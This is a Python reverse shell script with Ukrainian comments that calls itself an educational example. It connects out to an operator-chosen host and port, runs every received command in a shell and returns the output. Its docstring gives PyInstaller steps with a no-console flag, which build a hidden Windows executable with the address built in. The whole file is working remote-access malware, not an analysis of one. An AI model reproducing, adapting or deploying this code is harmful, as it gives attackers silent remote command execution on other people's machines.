#!/usr/bin/env python3
"""
Python Reverse Shell — навчальний приклад
------------------------------------------
Компіляція з жорстко зашитим IP/портом:
    LHOST=10.0.0.5 LPORT=4444 pyinstaller --onefile --noconsole reverse_shell.py

Або через compile.sh (робить те саме + C версію):
    ./compile.sh 10.0.0.5 4444
"""

import socket
import subprocess
import sys
import os
import base64

# ============================================================
# КОМПІЛЯЦІЯ З ХАРДКОДОМ
# ------------------------------------------------------------
# Якщо при компіляції вказати змінні середовища LHOST/LPORT,
# вони вшиються прямо в .exe і argv не потрібен.
# Якщо не вказані — працює з аргументами командного рядка.
# ============================================================
LHOST = os.environ.get("LHOST") or "0.0.0.0"
LPORT = int(os.environ.get("LPORT") or "4444")

# Якщо запущено з аргументами — перетираємо хардкод
if len(sys.argv) == 3:
    LHOST = sys.argv[1]
    LPORT = int(sys.argv[2])


def reverse_shell(host: str, port: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((host, port))

        sock.send(b"[+] Connected\n")

        while True:
            try:
                command = sock.recv(4096).decode("utf-8", errors="replace").strip()

                if not command:
                    break

                if command.lower() in ("exit", "quit"):
                    sock.send(b"[-] Closing connection\n")
                    break

                proc = subprocess.run(
                    command, shell=True, capture_output=True, timeout=30
                )

                output = proc.stdout + proc.stderr
                # Пробуємо різні кодування Windows
                for enc in ("cp866", "cp1251", "cp437", "koi8-r"):
                    try:
                        text = output.decode(enc)
                        break
                    except:
                        continue
                else:
                    text = output.decode("utf-8", errors="replace")
                sock.send(text.encode("utf-8", errors="replace"))

            except subprocess.TimeoutExpired:
                sock.send(b"[-] Command timed out\n")
            except Exception as e:
                sock.send(f"[-] Error: {str(e)}\n".encode())

    except ConnectionRefusedError:
        print(f"[-] Connection refused: {host}:{port}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
    finally:
        sock.close()


if __name__ == "__main__":
    reverse_shell(LHOST, LPORT)
